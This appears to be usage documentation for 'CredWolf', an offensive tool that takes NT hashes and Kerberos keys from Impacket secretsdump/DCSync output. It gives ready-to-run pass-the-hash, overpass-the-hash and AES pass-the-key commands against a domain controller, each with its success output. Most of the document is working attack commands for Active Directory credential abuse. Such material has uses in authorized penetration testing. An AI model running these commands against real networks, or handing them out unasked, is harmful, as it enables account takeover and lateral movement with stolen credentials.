# Working with secretsdump output

CredWolf accepts hashes and keys directly from Impacket's `secretsdump.py` / DCSync output. Here's how each format maps to credwolf flags.

## SAM / NTDS dump

Format: `user:RID:LM:NT:::`

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
```

Use the NT hash (4th field) with `--hash` for NTLM or `--rc4-key` for Kerberos:

```bash
# NTLM pass-the-hash
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 7facdc498ed1680c4fd1448319a8c04f
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@nt_hash

# The LM:NT pair is also accepted
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f'
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@nt_hash

# Kerberos overpass-the-hash (NT hash = RC4 key)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --rc4-key 7facdc498ed1680c4fd1448319a8c04f --transport tcp
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@rc4_key
```

## Kerberos keys

Format: `user:etype:key`

```
Administrator:aes256-cts-hmac-sha1-96:9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925
Administrator:aes128-cts-hmac-sha1-96:4bbb66ffd90a18f248b909016eb4b75f
```

Use the hex key (3rd field) with the matching `--aes256-key` or `--aes128-key` flag:

```bash
# AES256 pass-the-key
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --aes256-key 9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925 --transport tcp
# [+] evil.corp/Administrator:9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925@aes256_key

# AES128 pass-the-key
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --aes128-key 4bbb66ffd90a18f248b909016eb4b75f --transport tcp
# [+] evil.corp/Administrator:4bbb66ffd90a18f248b909016eb4b75f@aes128_key

# All three key types combined in one run
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --rc4-key 7facdc498ed1680c4fd1448319a8c04f --aes256-key 9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925 --transport tcp
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@rc4_key
# [+] evil.corp/Administrator:9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925@aes256_key
```
